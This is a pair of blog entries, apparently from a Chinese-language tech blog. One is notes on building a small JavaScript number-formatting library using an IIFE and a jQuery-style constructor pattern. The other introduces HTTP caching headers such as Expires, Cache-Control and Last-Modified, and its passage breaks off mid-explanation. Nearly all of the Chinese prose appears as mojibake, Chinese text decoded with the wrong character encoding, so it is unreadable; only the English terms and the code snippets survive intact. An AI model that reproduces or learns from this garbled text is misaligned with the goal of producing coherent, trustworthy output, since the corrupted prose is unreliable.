    <title>[ç­†è¨˜] JavaScript: Understanding the Weird Parts - Build your own lib/framework</title>
    <url>/2018/05/05/build-own-js-lib/</url>
    <content><![CDATA[ä¹‹å‰è¶è‘— Udemy ç‰¹åƒ¹ï¼Œè²·äº†ä¸Šé¢å¾ˆæœ‰åçš„èª²ç¨‹ - JavaScript: Understanding the Weird Partsï¼Œç•¶åˆæœƒæƒ³è²·æ˜¯å› ç‚ºä»–æœ€å¾Œé¢æœ‰å€‹ç« ç¯€æ˜¯ä»‹ç´¹å¦‚ä½•å»ºæ§‹è‡ªå·±çš„ JS Frameworkï¼Œè€Œæˆ‘ä¸€ç›´éƒ½å¾ˆæƒ³æœ‰ç³»çµ±æ€§åœ°å»ç­è§£å»ºæ§‹ä¸€å€‹å¯ä¾›å¤§å®¶ä½¿ç”¨çš„ JS library æˆ–æ˜¯ framework éœ€è¦æ³¨æ„å“ªäº›äº‹é …ï¼Œè©²æ€éº¼å¯«æ‰æ˜¯å®‰å…¨æœ‰å½ˆæ€§çš„çµæ§‹ã€‚
å¾Œä¾†å¤§ç´„èŠ±äº†ä¸‰å¤©çš„æ™‚é–“æ–·æ–·çºŒçºŒæŠŠèª²ç¨‹ä¸Šå®Œï¼Œé€™é‚Šç´€éŒ„ä¸€ä¸‹è©²ç« ç¯€çš„ä¸€äº›ç­†è¨˜ï¼Œä¸¦å¯¦åšä¸€å€‹å°å°çš„ js library ç•¶ç¯„ä¾‹ã€‚
Goalç›®æ¨™æ˜¯å»ºæ§‹ä¸€å€‹ js libraryï¼Œå¯ä»¥å°‡æ•¸å­—åšä¸€äº›ç°¡åŒ–ç´„åˆ†ï¼Œåƒæ˜¯æˆ‘åœ¨ Web Component å¯¦æˆ° ä¸­æ‰€å¯¦ä½œçš„ functionã€‚ä¸¦è®“ user é€é &lt;script src=&quot;formatNum.js&quot; /&gt; çš„æ–¹å¼å°±èƒ½è¼‰å…¥ä½¿ç”¨ã€‚
å®Œæ•´çš„ code åœ¨ä¸‹é¢é€™å€‹ jsbin ä¸­ï¼š
JS Bin on jsbin.com
å¯ä»¥è©¦è‘—åœ¨ console ä¸­è¼¸å…¥ä»¥ä¸‹æŒ‡ä»¤ä¾†çœ‹çœ‹çµæœï¼švar f = F$(&#39;1E9&#39;);f.format().log();f.format(&#39;scientific&#39;).log()
Structuring Safe Codeè¦å»ºæ§‹ä¸€å€‹å®‰å…¨çš„ JS libï¼Œå‹¢å¿…éœ€è¦ä¿è­·å¥½è‡ªå·±çš„ scope ä¸å—å¤–éƒ¨å½±éŸ¿ï¼Œä¹Ÿä¸æœƒå»å½±éŸ¿å¤–éƒ¨ã€‚è¦åšåˆ°é€™ä»¶äº‹æœ€ç°¡å–®çš„æ–¹å¼å°±æ˜¯ä½¿ç”¨ä¸€å€‹ IIFE (Immediately Invoked Function Expression)ï¼Œ
;(function(global) &#123;        &#125;(window));

è€Œæˆ‘å€‘éœ€è¦å°‡ lib èƒ½å¤  export åˆ°å¤–éƒ¨ä¾›äººä½¿ç”¨ï¼Œæ‰€ä»¥åœ¨é€™å€‹ç«‹å³åŸ·è¡Œå‡½å¼ä¸­éœ€è¦å‚³å…¥ window ç‰©ä»¶ï¼Œåœ¨å‡½å¼å…§æˆ‘å€‘å‰‡å–åç‚º globalï¼Œé€™æ¨£æœªä¾†å¦‚æœæƒ³è¦åŸ·è¡Œåœ¨ä¸åŒç’°å¢ƒï¼Œåƒæ˜¯ nodejs è£¡é¢æ™‚ï¼Œå¯ä»¥ä¸ç”¨æ›´æ”¹å…§éƒ¨çš„è®Šæ•¸åç¨±ï¼Œåªè¦ä¿®æ”¹å‚³å…¥çš„ window è®Šæ•¸å³å¯ã€‚
å¦å¤–æœ€å‰æ–¹å¯ä»¥åŠ ä¸Šå€‹åˆ†è™Ÿï¼Œä»¥å…æœ‰å…¶ä»–äººçš„ code æ²’æœ‰ç”¨åˆ†è™Ÿåšçµå°¾è€Œé€ æˆå•é¡Œï¼Œä¸éé€™å€‹ä¸¦ä¸æ˜¯å¿…é ˆçš„ã€‚
åœ¨é€™å€‹ç«‹å³åŸ·è¡Œå‡½å¼ä¸­çš„è®Šæ•¸é™¤éæˆ‘å€‘åˆ»æ„ export å‡ºå»ï¼Œå¦å‰‡éƒ½åªå­˜åœ¨æ–¼è‡ªå·±çš„ä½œç”¨åŸŸå…§ï¼Œæ˜¯å€‹å®‰å…¨çš„çµæ§‹ã€‚
ä¸‹æ–¹çš„ supportedUnit èˆ‡ unit åœ¨å¤–éƒ¨éƒ½ç„¡æ³•å­˜å–ï¼Œç„¡æ³•é€é FormaNum.unit å–å¾—ã€‚
;(function(global) &#123;     // hidden within the scope of the IIFE and never directly accessible    const supportedUnit = [&#x27;normal&#x27;, &#x27;scientific&#x27;];        const unit = &#123;        normalUnit: [          &#123; value: 1000000000,  symbol: &quot;B&quot; &#125;,          &#123; value: 1000000,  symbol: &quot;M&quot; &#125;,          &#123; value: 1000,  symbol: &quot;k&quot; &#125;        ],        siUnit: [          &#123; value: 1E18, symbol: &quot;E&quot; &#125;,          &#123; value: 1E15, symbol: &quot;P&quot; &#125;,          &#123; value: 1E12, symbol: &quot;T&quot; &#125;,          &#123; value: 1E9,  symbol: &quot;G&quot; &#125;,          &#123; value: 1E6,  symbol: &quot;M&quot; &#125;,          &#123; value: 1E3,  symbol: &quot;k&quot; &#125;        ],    &#125;    // ...    &#125;(window));

Object, Prototype and Propertiesæ¥è‘—å°±æ˜¯é–‹å§‹å¯¦ä½œæˆ‘å€‘çš„ lib å…§å®¹äº†ï¼Œé€™é–€èª²ç¨‹ä¸­ï¼Œæœ‰å¸¶è‘—æˆ‘å€‘äº†è§£ JQuery çš„ source codeï¼Œçœ‹çœ‹é€™å€‹å‰å¤§çš„ lib æ˜¯å¦‚ä½•æ¶æ§‹å…¶å…§éƒ¨ç¨‹å¼ï¼Œå…¶ä¸­å¾ˆç‰¹åˆ¥çš„åœ°æ–¹åœ¨æ–¼å®ƒ new ä¸€å€‹ç‰©ä»¶çš„æ–¹å¼ï¼Œé€šå¸¸æˆ‘å€‘è¼‰å…¥ä¸€å€‹åˆ¥äººå¯«å¥½çš„ç‰©ä»¶ï¼Œæˆ–æ˜¯æˆ‘å€‘è‡ªå·±å¯«å¥½äº†ä¸€å€‹ç‰©ä»¶ï¼Œè¦ä½¿ç”¨çš„æ™‚å€™æœƒéœ€è¦é€é const objectInstanc = new Object() çš„æ–¹å¼ä¾†ç”¢ç”Ÿç‰©ä»¶å¯¦ä¾‹ï¼Œä½†ç‚ºä½•æˆ‘å€‘ä½¿ç”¨ JQuery çš„æ™‚å€™éƒ½ä¸éœ€è¦ç‰¹åˆ¥ä½¿ç”¨ new é—œéµå­—å‘¢ï¼Ÿ
å› ç‚ºåœ¨ JQuery ä¸­ï¼Œä»–é€éä¸‹é¢çš„æ–¹å¼ä¾†å¹«ä½ åœ¨æ¯æ¬¡ä½¿ç”¨å®ƒæ™‚è‡ªå‹• new äº†ä¸€å€‹ç‰©ä»¶ï¼š
// &#x27;new&#x27; an objectconst FormatNum = function(num, digits, unit) &#123;    return new FormatNum.init(num, digits, unit);   &#125;//...// the actual object is created here, allowing us to &#x27;new&#x27; an object without calling &#x27;new&#x27;FormatNum.init = function(num, digits, unit) &#123;        const self = this;    self.num = num || &#x27;&#x27;;    self.digits = digits || &#x27;&#x27;;    self.unit = unit || &#x27;normal&#x27;;        self.validate();    &#125;;

é€™æ™‚å€™ä½ å¯èƒ½æœƒæƒ³èªªï¼Œé€™æ¨£çš„å¯«æ³•ï¼Œä¸å°±ä»£è¡¨æˆ‘è¦åŠ  method åˆ° prototype çš„è©±ï¼Œéƒ½æ˜¯è¦åŠ åœ¨ FormatNum.init.prototype äº†å—ï¼Ÿ é€™æ¨£æœ‰é»å¥‡æ€ªè€¶ï¼Œç•¢ç«Ÿæˆ‘çš„ lib æ˜¯å«åš FormatNumå‘€ï¼
æ²’éŒ¯ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥å°‡ FormatNum.init.prototype åœ¨æŒ‡å®šåˆ° FormatNum.prototype ä¸Šï¼š
FormatNum.init.prototype = FormatNum.prototype;

é€éçŸ­çŸ­é€™å…©å€‹æ­¥é©Ÿï¼Œæˆ‘å€‘å°±èƒ½å¤ ä¸éœ€è¦è‡ªå·± new objectï¼ŒåŒæ™‚åˆèƒ½ç›´æ¥åœ¨ FormatNum ä¸Šé¢è¨­ç½® prototype methodï¼
å¦å¤–ï¼Œé€éåœ¨æ¯å€‹ method çš„æœ€å¾Œ return thisï¼Œå°±èƒ½è®“æˆ‘å€‘çš„ function chainableã€‚
// prototype holds methods (to save memory space)    FormatNum.prototype = &#123;                validate: function() &#123;            ///        &#125;,              calculate: function(unitType) &#123;          ///        &#125;,              formatScientific: function() &#123;          return this.calculate(&#x27;siUnit&#x27;);        &#125;,                formatNormal: function() &#123;          return this.calculate(&#x27;normalUnit&#x27;);        &#125;,        // chainable methods return their own containing object        format: function(unit) &#123;            let formattedNum;                        // if undefined or null it will be coerced to &#x27;false&#x27;            if (unit === &#x27;scientific&#x27;) &#123;                formattedNum = this.formatScientific();              &#125;            else &#123;                formattedNum = this.formatNormal();              &#125;                      this.formattedNum = formattedNum;            // &#x27;this&#x27; refers to the calling object at execution time            // makes the method chainable            return this;        &#125;,                log: function() &#123;            if (console) &#123;                console.log(&#x27;formattedNum is: &#x27; + this.formattedNum);             &#125;        &#125;,            &#125;;

export to outside worldæœ€å¾Œæˆ‘å€‘åªè¦åŠ ä¸Š global.FormatNum = global.F$ = FormatNum;
å°±å¯ä»¥åœ¨å¤–éƒ¨ä½¿ç”¨ FormatNum æˆ–æ˜¯ F$ ä¾†å‘¼å«æˆ‘å€‘çš„ lib äº†ï¼
çµè«–èˆ‡å°å•é¡Œå»ºé€  js lib çš„æ¦‚å¿µä¸é›£ï¼Œåªæ˜¯å¦‚æœå¾ˆå°‘é–‹ç™¼çš„è©±ï¼Œç¢ºå¯¦å®¹æ˜“å¿˜è¨˜ä¸€äº›çœ‰çœ‰è§’è§’ï¼Œé€éé€™æ¬¡çš„æ–‡ç« ä¹Ÿç®—æ˜¯ç¨ç¨å†è¤‡ç¿’äº†ä¸€ä¸‹å…ˆå‰èª²ç¨‹çš„å…§å®¹ã€‚å¦å¤–ï¼Œåœ¨å¯¦ä½œç¯„ä¾‹æ™‚ï¼Œæœ¬ä¾†æƒ³ç›´æ¥å…¨ç”¨ ES6 å¯«ï¼ˆèª²ç¨‹ä¸»è¦éƒ½æ˜¯ ES5ï¼‰ï¼Œä½†æ˜¯åœ¨é€™é‚Šçš„ function éƒ½ä¸èƒ½ç”¨ ES6 çš„ arrow function å–ä»£ï¼Œthis çš„ä½œç”¨åŸŸä¸åŒï¼Œæœƒé€ æˆå•é¡Œã€‚é€™ç¯‡æœ‰æåˆ°ï¼Œarrow function æœƒ binding åˆ°æ•´å€‹ module çš„ scopeï¼Œè€Œé objectã€‚æ‰€ä»¥å¦‚æœæ˜¯æƒ³é€é ES6 ä¾†æ’°å¯«çš„è©±ï¼Œæ‡‰è©²æ˜¯éœ€è¦æ›å¦ä¸€ç¨®å¯«æ³•ï¼Œä¹‹å¾Œæ‰¾åˆ°å¥½ä½œæ³•å†ä¾†è£œä¸Šã€‚
è³‡æ–™ä¾†æº
JavaScript: Understanding the Weird Parts

é—œæ–¼ä½œè€…ï¼š@arvinh å‰ç«¯æ”»åŸç…ï¼Œç†±æ„›æ•¸æ“šåˆ†æå’Œè³‡è¨Šè¦–è¦ºåŒ–
]]></content>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>å¾ªåºæ¼¸é€²ç†è§£ HTTP Cache æ©Ÿåˆ¶</title>
    <url>/2017/06/17/cache-introduction/</url>
    <content><![CDATA[å‰è¨€å‰é™£å­åœ¨ç ”ç©¶è·Ÿ HTTP Cache æœ‰é—œçš„ä¸€äº›æ±è¥¿ï¼Œçœ‹å¾—çœ¼èŠ±æ’©äº‚ï¼Œä¸åŒçš„ Header æ„ˆçœ‹æ„ˆæ··äº‚ï¼Œåƒæ˜¯Pragma, Cache-Control, Etag, Last-Modified, Expires ç­‰ç­‰ã€‚æ‰¾äº†è¨±å¤šåƒè€ƒè³‡æ–™é–±è®€ä¹‹å¾Œæ‰æœ‰äº†æ¯”è¼ƒæ·±åˆ»çš„ç†è§£ï¼Œæƒ³èªªè‹¥æ˜¯å¾ä¸€å€‹æ¯”è¼ƒä¸åŒçš„è§’åº¦ä¾†ç†è§£ Cacheï¼Œèªªä¸å®šæœƒæ¯”è¼ƒå®¹æ˜“äº†è§£é€™äº› Header åˆ°åº•åœ¨åšä»€éº¼ã€‚
åœ¨ä¹‹å‰æŸ¥çš„è³‡æ–™è£¡é¢ï¼Œå¾ˆå¤šç¯‡éƒ½æ˜¯é€ä¸€è§£é‡‹å„å€‹ Header çš„ä½œç”¨ä»¥åŠåƒæ•¸ï¼Œè€Œæˆ‘èªç‚ºå…¶å¯¦åƒæ•¸è¬›å¤šäº†å®¹æ˜“é€ æˆåˆå­¸è€…æ··æ·†ï¼Œæƒ³èªªæ€éº¼æœ‰é€™éº¼å¤šå¥‡æ€ªçš„åƒæ•¸ï¼Œè€Œä¸”æ¯ä¸€å€‹çœ‹èµ·ä¾†éƒ½å¾ˆåƒã€‚æ‰€ä»¥é€™ç¯‡æ–‡ç« å˜—è©¦ä¸€æ­¥ä¸€æ­¥è—‰ç”±ä¸åŒçš„å•é¡Œä¾†å¼•å°å‡ºå„å€‹ Header ä½¿ç”¨çš„å ´æ™¯ä»¥åŠå‡ºç¾çš„ç›®çš„ã€‚é‚„æœ‰ï¼Œå› ç‚ºé€™ç¯‡æ˜¯çµ¦åˆå­¸è€…çœ‹çš„ï¼Œæ‰€ä»¥ä¸æœƒè¬›åˆ°æ‰€æœ‰çš„åƒæ•¸ã€‚
å…¶å¯¦é—œæ–¼ Cache é€™ä¸€éƒ¨åˆ†ï¼Œå¾ˆå¤šç¶²è·¯è³‡æºçš„èªªæ³•éƒ½ä¸å¤ªä¸€æ¨£ï¼Œå¦‚æœç¢°åˆ°æœ‰ç–‘ç¾©çš„åœ°æ–¹æˆ‘æœƒç›¡é‡ä»¥ RFC ä¸Šé¢å¯«çš„æ¨™æº–ç‚ºä¸»ã€‚å¦‚æœæœ‰éŒ¯èª¤çš„è©±é‚„éº»ç…©ä¸åæŒ‡æ­£ï¼Œæ„Ÿè¬ã€‚
ç‚ºä»€éº¼éœ€è¦ Cacheå¤šå•ç‚ºä»€éº¼æ˜¯å€‹å¥½ç¿’æ…£ï¼Œåœ¨ä½ ç”¨ä¸€å€‹æ±è¥¿ä¹‹å‰ï¼Œå¿…é ˆçŸ¥é“ä½ ç‚ºä»€éº¼è¦ç”¨å®ƒã€‚æ–¼æ˜¯ï¼Œæˆ‘å€‘éœ€è¦å•è‡ªå·±ä¸€å€‹å•é¡Œï¼šç‚ºä»€éº¼éœ€è¦ Cacheï¼Ÿ
å¾ˆç°¡å–®ï¼Œå› ç‚ºç¯€çœæµé‡å˜›ï¼Œä¹Ÿç¯€çœæ™‚é–“ï¼Œæˆ–æ˜¯æ›´å®è§€åœ°ä¾†èªªï¼Œæ¸›å°‘è³‡æºçš„æè€—ã€‚
èˆ‰ä¾‹ä¾†èªªï¼Œä»Šå¤©é›»å•†ç¶²ç«™çš„é¦–é å¯èƒ½æœƒæœ‰å¾ˆå¤šå•†å“ï¼Œå¦‚æœä½ ä»Šå¤©æ¯ä¸€å€‹è¨ªå®¢åˆ°é¦–é ä½ éƒ½å»è³‡æ–™åº«é‡æ–°æŠ“ä¸€æ¬¡æ‰€æœ‰çš„è³‡æ–™ï¼Œé‚£å°è³‡æ–™åº«çš„è² æ“”æœƒéå¸¸éå¸¸å¤§ã€‚
å¯æ˜¯å‘¢ï¼Œå…¶å¯¦é¦–é çš„é€™äº›è³‡è¨ŠåŸºæœ¬ä¸ŠçŸ­æœŸä¹‹å…§æ˜¯ä¸æœƒè®Šçš„ï¼Œä¸€å€‹å•†å“çš„åƒ¹æ ¼ä¸å¯èƒ½ä¸Šä¸€ç§’æ˜¯ä¸€åƒå…ƒï¼Œä¸‹ä¸€ç§’å°±è®Šæˆå…©åƒå…ƒã€‚æ‰€ä»¥é€™äº›ä¸å¸¸è®Šå‹•çš„è³‡æ–™å°±å¾ˆé©åˆå„²å­˜èµ·ä¾†ï¼Œä¹Ÿå°±æ˜¯æˆ‘å€‘èªªçš„ Cacheï¼Œå°ç£ç¿»è­¯å«åšå¿«å–ï¼Œä¸­åœ‹ç¿»è­¯å«åšç·©å­˜ã€‚
ä¸Šé¢é€™å€‹ä¾‹å­å¯ä»¥æŠŠé¦–é çš„é‚£äº›è³‡è¨Šåœ¨æ’ˆå‡ºä¾†ä¸€æ¬¡ä¹‹å¾Œå°±å­˜åœ¨æŸå€‹åœ°æ–¹ï¼Œä¾‹å¦‚èªª Redisï¼Œå…¶å¯¦å°±æ˜¯ä»¥ä¸€å€‹ç°¡å–®çš„ Key Value Pair çš„å½¢å¼å­˜é€²å»å³å¯ï¼Œæ¥è‘—åªè¦æ˜¯ç”¨åˆ°é€™äº›è³‡è¨Šçš„æ™‚å€™ï¼Œéƒ½å¯ä»¥ç”¨æ¥µå¿«çš„é€Ÿåº¦æ’ˆå‡ºä¾†ï¼Œè€Œä¸æ˜¯å†åˆ°è³‡æ–™åº«è£¡é¢é‡æ–°ç®—ä¸€æ¬¡ã€‚
ä¸Šé¢è¬›çš„æ˜¯ Server side çš„ Cacheï¼Œè—‰ç”±æŠŠ Database çš„è³‡æ–™æ’ˆå‡ºä¾†ä¹‹å¾Œå­˜åˆ°åˆ¥çš„åœ°æ–¹é”æˆã€‚ä½† Server side çš„ Cache ä¸¦ä¸æ˜¯æˆ‘å€‘ä»Šå¤©çš„é‡é»ï¼Œæœ‰èˆˆè¶£çš„è®€è€…å€‘å¯ä»¥åƒè€ƒæˆ‘ä¹‹å‰å¯«éçš„ï¼šè³‡æ–™åº«çš„å¥½å¤¥ä¼´ï¼šRedisã€‚
ä»Šå¤©çš„é‡é»æ˜¯ Server è·Ÿç€è¦½å™¨ä¹‹é–“çš„ Cache æ©Ÿåˆ¶ã€‚
ä¾‹å¦‚èªªé›»å•†ç¶²ç«™çš„å•†å“åœ–å¥½äº†ã€‚å¦‚æœæ²’æœ‰ Cache çš„è©±ï¼Œé‚£é¦–é å‡ºç¾çš„ä¸Šç™¾å¼µå•†å“åœ–ï¼Œåªè¦ç¶²é è¢«ç€è¦½å¹¾æ¬¡ï¼Œå°±æœƒè¢«ä¸‹è¼‰å¹¾æ¬¡ï¼Œé€™å€‹æµé‡æ˜¯éå¸¸é©šäººçš„ã€‚æ‰€ä»¥æˆ‘å€‘å¿…é ˆè®“ç€è¦½å™¨å¯ä»¥æŠŠé€™äº›åœ–ç‰‡çµ¦ Cache èµ·ä¾†ã€‚é€™æ¨£åªæœ‰ç¬¬ä¸€æ¬¡ç€è¦½é€™å€‹ç¶²é çš„æ™‚å€™éœ€è¦é‡æ–°ä¸‹è¼‰ï¼Œç¬¬äºŒæ¬¡ç€è¦½çš„æ™‚å€™ï¼Œåœ–ç‰‡å°±å¯ä»¥ç›´æ¥å¾ç€è¦½å™¨çš„å¿«å–è£¡é¢å»æŠ“ï¼Œä¸ç”¨å†è·Ÿ Server æ‹¿è³‡æ–™äº†ã€‚
Expiresè¦é”æˆä¸Šè¿°çš„åŠŸèƒ½ï¼Œå¯ä»¥åœ¨ HTTP Response Header è£¡é¢åŠ ä¸Šä¸€å€‹Expiresçš„å­—æ®µï¼Œè£¡é¢å°±æ˜¯é€™å€‹ Cache åˆ°æœŸçš„æ™‚é–“ï¼Œä¾‹å¦‚èªªï¼š
Expires: Wed, 21 Oct 2017 07:28:00 GMT

ç€è¦½å™¨æ”¶åˆ°é€™å€‹ Response ä¹‹å¾Œå°±æœƒæŠŠé€™å€‹è³‡æºçµ¦å¿«å–èµ·ä¾†ï¼Œç•¶ä¸‹ä¸€æ¬¡ä½¿ç”¨è€…å†åº¦é€ è¨ªé€™å€‹é é¢æˆ–æ˜¯è¦æ±‚é€™å€‹åœ–ç‰‡çš„è³‡æºçš„æ™‚å€™ï¼Œç€è¦½å™¨æœƒæª¢è¦–ã€Œç¾åœ¨çš„æ™‚é–“ã€æ˜¯å¦æœ‰è¶…éé€™å€‹ Expiresã€‚å¦‚æœæ²’æœ‰è¶…éçš„è©±ï¼Œé‚£ç€è¦½å™¨ã€Œä¸æœƒç™¼é€ä»»ä½• Requestã€ï¼Œè€Œæ˜¯ç›´æ¥å¾é›»è…¦è£¡é¢å·²ç¶“å­˜å¥½çš„ Cache æ‹¿è³‡æ–™ã€‚
è‹¥æ˜¯æ‰“é–‹ Chrome dev toolï¼Œå°±æœƒçœ‹åˆ°å®ƒå¯«è‘—ï¼šã€ŒStatus code 200 (from disk cache)ã€ï¼Œä»£è¡¨é€™å€‹ Request å…¶å¯¦æ²’æœ‰ç™¼å‡ºå»ï¼ŒResponse æ˜¯ç›´æ¥å¾ disk cache è£¡é¢æ‹¿çš„ã€‚

å¯æ˜¯é€™æ¨£å…¶å¯¦æœƒç¢°åˆ°ä¸€å€‹å•é¡Œï¼Œå› ç‚ºç€è¦½å™¨æª¢è¦–é€™å€‹ Expires çš„æ™‚é–“æ˜¯ç”¨ã€Œé›»è…¦æœ¬èº«çš„æ™‚é–“ã€ï¼Œé‚£å¦‚æœæˆ‘å–œæ­¡æ´»åœ¨æœªä¾†ï¼ŒæŠŠé›»è…¦çš„æ™‚é–“æ”¹æˆ 2100 å¹´ï¼Œæœƒæ€æ¨£å‘¢ï¼Ÿ
ç€è¦½å™¨å°±æœƒè¦ºå¾—æ‰€æœ‰çš„ Cache éƒ½æ˜¯éæœŸçš„ï¼Œå°±æœƒé‡æ–°ç™¼é€ Requestã€‚
Cache-Control èˆ‡ max-ageExpires å…¶å¯¦æ˜¯ HTTP 1.0 å°±å­˜åœ¨çš„ Headerï¼Œè€Œç‚ºäº†è§£æ±ºä¸Šé¢ Expires æœƒç¢°åˆ°çš„å•é¡Œï¼ŒHTTP 1.1 æœ‰ä¸€å€‹æ–°çš„ header å‡ºç¾äº†ï¼Œå«åšï¼šCache-Controlã€‚ï¼ˆè¨»ï¼šCache-Control æ˜¯ HTTP 1.1 å‡ºç¾çš„ Headerï¼Œä½†å…¶å¯¦ä¸å–®å–®åªæ˜¯è§£æ±ºé€™å€‹å•é¡Œï¼Œé‚„è§£æ±ºè¨±å¤š HTTP 1.0 æ²’è¾¦æ³•è™•ç†çš„å¿«å–ç›¸é—œå•é¡Œï¼‰
å…¶ä¸­ä¸€ç¨®ç”¨æ³•æ˜¯ï¼šCache-Control: max-age=30ï¼Œå°±ä»£è¡¨é€™å€‹ Response çš„éæœŸæ™‚é–“æ˜¯ 30 ç§’ã€‚å‡è¨­ä½¿ç”¨è€…åœ¨æ”¶åˆ°é€™å€‹ Response ä¹‹å¾Œçš„ç¬¬ 10 ç§’é‡æ–°æ•´ç†ï¼Œé‚£å°±æœƒå‡ºç¾ä¸Šé¢é‚£æ¨£è¢«ç€è¦½å™¨ Cache ä½çš„ç¾è±¡ã€‚
ä½†å‡å¦‚ä½¿ç”¨è€…æ˜¯é 60 ç§’ä¹‹å¾Œæ‰é‡æ–°æ•´ç†ï¼Œç€è¦½å™¨å°±æœƒç™¼é€æ–°çš„ Requestã€‚

ä»”ç´°è§€å¯Ÿ Google Logo æª”æ¡ˆçš„ Response headerï¼Œä½ æœƒç™¼ç¾å®ƒçš„max-ageè¨­å®šæˆ31536000ç§’ï¼Œä¹Ÿå°±æ˜¯ 365 å¤©çš„æ„æ€ã€‚åªè¦ä½ åœ¨ä¸€å¹´ä¹‹å…§é€ è¨ªé€™å€‹ç¶²ç«™ï¼Œéƒ½ä¸æœƒå° Google logo é€™å¼µåœ–ç‰‡é€å‡º Requestï¼Œè€Œæ˜¯æœƒç›´æ¥ä½¿ç”¨ç€è¦½å™¨å·²ç¶“å¿«å–ä½çš„ Responseï¼Œä¹Ÿå°±æ˜¯é€™é‚Šå¯«çš„Status code 200 (from memory cache)ã€‚
ç¾åœ¨å°±ç¢°åˆ°ä¸€å€‹å•é¡Œäº†ï¼Œæ—¢ç„¶Expiresè·Ÿmax-ageéƒ½å¯ä»¥æ±ºå®šä¸€å€‹ Response æ˜¯å¦éæœŸï¼Œé‚£å¦‚æœå…©å€‹åŒæ™‚å‡ºç¾ï¼Œç€è¦½å™¨è¦çœ‹å“ªä¸€å€‹å‘¢ï¼Ÿ
æ ¹æ“šRFC2616çš„å®šç¾©ï¼š

If a response includes both an Expires header and a max-age directive, the max-age directive overrides the Expires header, even if the Expires header is more restrictive

max-ageæœƒè“‹éExpiresã€‚å› æ­¤ç¾åœ¨çš„å¿«å–å„˜ç®¡å…©å€‹éƒ½æœƒæ”¾ï¼Œä½†å…¶å¯¦çœŸæ­£æœƒç”¨åˆ°çš„æ˜¯max-ageã€‚
éæœŸäº†ï¼Œç„¶å¾Œå‘¢ï¼Ÿä¸Šé¢é€™å…©å€‹ Header éƒ½æ˜¯åœ¨é—œæ³¨ä¸€å€‹ Response çš„ã€Œæ–°é®®åº¦(freshness)ã€ï¼Œå¦‚æœ Response å¤ æ–°é®®çš„è©±ï¼ˆä¹Ÿå°±æ˜¯é‚„æ²’è¶…éExpireæˆ–è€…æ˜¯åœ¨max-ageè¦å®šçš„æœŸé™è£¡é¢ï¼‰ï¼Œå°±ç›´æ¥å¾å¿«å–è£¡é¢æ‹¿è³‡æ–™ã€‚å¦‚æœéæœŸäº†ã€ä¸æ–°é®®äº†ï¼Œå°±ç™¼é€ Request å»è·Ÿ Server æ‹¿æ–°çš„è³‡æ–™ã€‚
ä½†æ˜¯é€™é‚Šè¦ç‰¹åˆ¥æ³¨æ„ä¸€é»ï¼šã€ŒéæœŸäº†ä¸ä»£è¡¨ä¸èƒ½ç”¨ã€
é€™æ˜¯ä»€éº¼æ„æ€å‘¢ï¼Ÿå‰›å‰›æœ‰æåˆ°èªª Google çš„ Logo å¿«å–æ™‚é–“æ˜¯ä¸€å¹´ï¼Œä¸€å¹´ä¹‹å¾Œç€è¦½å™¨å°±æœƒé‡æ–°ç™¼å‡º Request å°å§ï¼Ÿå¯æ˜¯å¾ˆæœ‰å¯èƒ½ Google çš„ Logo åœ¨ä¸€å¹´ä¹‹å¾Œä¹Ÿä¸æœƒæ›ï¼Œä»£è¡¨å…¶å¯¦ç€è¦½å™¨å¿«å–èµ·ä¾†çš„åœ–ç‰‡é‚„æ˜¯å¯ä»¥ç”¨çš„ã€‚
å¦‚æœæ˜¯é€™ç¨®æƒ…æ³ï¼Œé‚£ Server å°±ä¸å¿…è¿”å›æ–°çš„åœ–ç‰‡ï¼Œåªè¦è·Ÿç€è¦½å™¨èªªï¼šã€Œä½ å¿«å–çš„åœ–ç‰‡å¯ä»¥ç¹¼çºŒç”¨ä¸€å¹´å–”ã€å°±å¯ä»¥äº†ã€‚
Last-Modified èˆ‡ If-Modified-Sinceæƒ³è¦åšåˆ°ä¸Šé¢çš„åŠŸèƒ½ï¼Œå¿…é ˆè¦ Server è·Ÿ Client å…©é‚Šäº’ç›¸é…åˆæ‰è¡Œã€‚å…¶ä¸­ä¸€ç¨®åšæ³•å°±æ˜¯ä½¿ç”¨ HTTP 1.0 å°±æœ‰çš„ï¼šLast-Modifiedèˆ‡If-Modified-Sinceçš„æ­é…ä½¿ç”¨ã€‚
åœ¨ Server å‚³é€ Response çš„æ™‚å€™ï¼Œå¯ä»¥å¤šåŠ ä¸€å€‹Last-Modifiedçš„ Headerï¼Œè¡¨ç¤ºé€™å€‹æª”æ¡ˆä¸Šä¸€æ¬¡æ›´æ”¹æ˜¯ä»€éº¼æ™‚å€™ã€‚è€Œç•¶å¿«å–éæœŸï¼Œç€è¦½å™¨ä¸‹æ¬¡å†ç™¼é€ Request çš„æ™‚å€™ï¼Œå°±å¯ä»¥åˆ©ç”¨é€™å€‹è³‡è¨Šï¼Œæ”¹ç”¨If-Modified-Sinceä¾†è·Ÿ Server æŒ‡å®šæ‹¿å–ï¼šæŸå€‹æ™‚é–“é»ä»¥å¾Œæœ‰æ›´æ”¹çš„è³‡æ–™ã€‚
ç›´æ¥èˆ‰ä¸€å€‹ä¾‹å­å§ï¼Œå‡è¨­æˆ‘è¦æ±‚ Google é¦–é çš„åœ–ç‰‡æª”æ¡ˆï¼Œæ”¶åˆ°äº†é€™æ¨£çš„ Responseï¼ˆç‚ºäº†æ–¹ä¾¿é–±è®€ï¼Œæ—¥æœŸçš„æ ¼å¼æœ‰æ›´æ”¹éï¼Œå¯¦éš›ä¸Šçš„å…§å®¹ä¸æœƒæ˜¯é€™æ¨£ï¼‰ï¼š
Last-Modified: 2017-01-01 13:00:00Cache-Control: max-age=31536000

ç€è¦½å™¨æ”¶åˆ°ä¹‹å¾Œå°±æœƒæŠŠé€™å¼µåœ–ç‰‡å­˜é€²å¿«å–ï¼Œä¸¦ä¸”æ¨™æ˜é€™å€‹æª”æ¡ˆçš„æœ€å¾Œæ›´æ–°æ™‚é–“æ˜¯ï¼š2017-01-01 13:00:00ï¼ŒéæœŸæ™‚é–“æ˜¯ä¸€å¹´å¾Œã€‚
